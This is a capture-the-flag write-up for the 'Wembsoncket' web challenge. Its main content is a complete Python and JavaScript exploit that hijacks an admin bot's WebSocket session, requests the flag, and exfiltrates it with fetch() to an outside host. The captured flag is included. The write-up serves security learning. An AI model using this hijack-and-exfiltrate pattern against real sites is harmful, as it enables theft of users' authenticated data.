---
ai_date: 2025-05-17 21:39:09
ai_summary: Unprotected WebSocket allows remote code execution and flag retrieval
ai_tags:
  - ws
  - xss
  - rce
created: 2025-05-17T05:00
points: 446
solves: 88
title: Wembsoncket
updated: 2025-05-17T21:52
---

Well there is no protection what-so-ever.

We can run whatever JS we want just by serving a page to the bot.

Straight forward exploit, we make the bot connect to the websocket and then get the flag, then send the flag back to us.

```python
from server import webhook
import requests
import asyncio
import json
import websockets

payload = """
<script>
  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
  ws.onopen = () => {
    ws.send(JSON.stringify({ message: '/getFlag' }));
  };
  ws.onmessage = ev => {
    const data = JSON.parse(ev.data).message;
    fetch(`https://1337.yun.ng?flag=${encodeURIComponent(data)}`);
  };
</script>
"""

async def main():
    s = requests.Session()
    target = "https://wembsoncket.chal.cyberjousting.com"
    s.get(target)
    token = s.cookies.get("token")
    uri = "wss://wembsoncket.chal.cyberjousting.com"
    print("Token:", token)
    extra_headers = {'Cookie': f'token={token}'}

    stop, wait = webhook(1337, content_type="text/html", payload=payload)
    async with websockets.connect(uri, extra_headers=extra_headers) as websocket:
        message = {"message": "https://1337.yun.ng"}
        await websocket.send(json.dumps(message))
        print("Sent:", message)
        a = wait()
        print(a)
        b = wait()
        print('flag', b)
        response = await websocket.recv()
        print("Received:", response)
        stop()
        print("Server stopped.")

if __name__ == "__main__":
    asyncio.run(main())
```

```flag
byuctf{CSWSH_1s_a_b1g_acr0nym}
```